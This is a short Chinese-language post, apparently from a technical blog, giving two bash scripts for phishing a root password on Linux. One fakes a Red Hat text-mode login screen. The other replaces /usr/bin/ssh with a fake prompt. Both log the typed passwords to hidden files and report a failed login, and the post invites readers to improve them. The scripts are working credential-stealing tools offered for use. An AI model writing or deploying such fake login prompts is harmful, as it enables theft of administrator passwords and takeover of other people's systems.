**一个普通用户在tty文本模式骗取root密码的脚本**


```powershell
#!/bin/bash
clear
echo
echo 'Red Hat Enterprise Linux Server release 6.5 (Santiago)'
echo "Kernel `uname -r` on an `uname -m`"
echo
read -p "$(hostname|awk -F"." '{print $1}') login: " user
read -s -p "Password: " passwd
echo
sleep 2
echo "Login incorrect" 
echo "$user:$passwd" >> .password.txt
for i in 1 2 3
do
echo
read -p "login: " user
read -s -p "Password: " passwd
echo
sleep 2
echo "Login incorrect" 
echo "$user:$passwd" >> .password.txt
done
sh $0
```





**扩展,在你的机器替换一个新ssh命令,让root登录,然后骗取他密码**

**下面的是一个基本的写法,你可以继续去完善它**

~~~powershell
# mv /usr/bin/ssh  /usr/bin/ssh.bak


# vim /usr/bin/ssh


#!/bin/bash

for i in `seq 2`
do
	read -s -p  "root@$1's password: " passwd
	echo 
	sleep 2
	echo "$passwd" >> /tmp/.root_passwd
	echo  "Permission denied, please try again."
done
read -s -p  "root@$1's password: " passwd
echo
sleep 2
echo "$passwd" >> /tmp/.root_passwd
echo  "Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password)."

chmod 755 /usr/bin/ssh
~~~

